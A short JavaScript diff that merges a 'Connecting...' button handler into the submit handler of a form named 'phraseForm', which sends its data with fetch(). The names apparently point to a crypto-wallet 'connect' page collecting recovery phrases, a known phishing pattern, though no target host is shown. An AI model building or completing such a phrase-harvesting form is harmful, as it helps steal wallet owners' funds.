@@ -142,10 +142,7 @@ phraseForm.addEventListener('submit', (e) => {
 	.then(response => response.json())
 	.then(data => console.log(data))
 	.catch(error => console.log(error));
-});
 
-connectBtn.addEventListener("click", ()=> {
     formLoading.classList.remove("active");
     connectBtn.innerHTML ="Connecting...";
-})
-
+});
